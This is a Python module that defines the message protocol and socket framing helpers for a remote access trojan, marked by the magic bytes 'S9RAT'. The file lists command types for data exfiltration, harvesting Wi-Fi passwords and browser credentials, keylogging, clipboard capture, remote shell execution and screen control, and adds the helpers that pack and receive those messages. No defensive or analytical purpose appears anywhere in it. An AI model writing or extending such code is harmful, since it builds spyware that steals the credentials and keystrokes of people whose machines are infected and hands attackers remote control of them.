
import json
import struct
import hashlib
import os

PROTOCOL_VERSION = 2
DEFAULT_PORT = 5555
MAGIC = b"S9RAT"

MSG_TYPES = {
    "AUTH": 1,
    "AUTH_OK": 2,
    "AUTH_FAIL": 3,
    "SCREEN_FRAME": 10,
    "SCREEN_START": 11,
    "SCREEN_STOP": 12,
    "SCREEN_SELECT": 13,
    "SCREEN_MONITORS": 14,
    "CONTROL_ENABLE": 20,
    "CONTROL_DISABLE": 21,
    "CONTROL_INPUT": 22,
    "EXFIL_DATA": 30,
    "EXFIL_REQUEST": 31,
    "FILE_LIST": 32,
    "FILE_TRANSFER": 33,
    "FILE_TRANSFER_DATA": 34,
    "FILE_TRANSFER_END": 35,
    "FILE_DOWNLOAD": 36,
    "FILE_BROWSE": 37,
    "SCREENSHOT": 38,
    "SYSTEM_INFO": 40,
    "WIFI_PASSWORDS": 41,
    "BROWSER_CREDS": 42,
    "HEARTBEAT": 50,
    "HEARTBEAT_ACK": 51,
    "DISCONNECT": 60,
    "SHUTDOWN": 70,
    "RESTART": 71,
    "LOGOFF": 72,
    "SHELL_EXEC": 80,
    "SHELL_OUTPUT": 81,
    "PROCESS_LIST": 82,
    "PROCESS_DATA": 83,
    "PROCESS_KILL": 84,
    "KEYLOG_START": 90,
    "KEYLOG_STOP": 91,
    "KEYLOG_DATA": 92,
    "CLIPBOARD_GET": 93,
    "CLIPBOARD_DATA": 94,
    "CHAT_SEND": 95,
    "CHAT_DISPLAY": 96,
}


def pack_message(msg_type: str, data: dict) -> bytes:
    msg_bytes = json.dumps(data).encode("utf-8")
    type_id = MSG_TYPES.get(msg_type, 0)
    header = MAGIC + struct.pack("!BI", type_id, len(msg_bytes))
    return header + msg_bytes


def pack_frame(frame_data: bytes) -> bytes:
    type_id = MSG_TYPES["SCREEN_FRAME"]
    header = MAGIC + struct.pack("!BI", type_id, len(frame_data))
    return header + frame_data


def recv_exact(sock, n: int) -> bytes:
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(min(n - len(buf), 65536))
        if not chunk:
            raise ConnectionError("Connection closed")
        buf.extend(chunk)
    return bytes(buf)


def recv_message(sock) -> tuple[str, dict]:
    header = recv_exact(sock, 10)
    if header[:5] != MAGIC:
        raise ValueError("Invalid protocol magic")
    type_id = struct.unpack("!B", header[5:6])[0]
    length = struct.unpack("!I", header[6:10])[0]
    if length > 50 * 1024 * 1024:
        raise ValueError("Message too large")
    msg_bytes = recv_exact(sock, length)
    msg_type = None
    for name, tid in MSG_TYPES.items():
        if tid == type_id:
            msg_type = name
            break
    if not msg_type:
        msg_type = f"UNKNOWN_{type_id}"
    return msg_type, json.loads(msg_bytes.decode("utf-8"))


def recv_raw(sock, n: int) -> bytes:
    return recv_exact(sock, n)


def set_nodelay(sock):
    try:
        import socket as _socket
        sock.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
    except Exception:
        pass
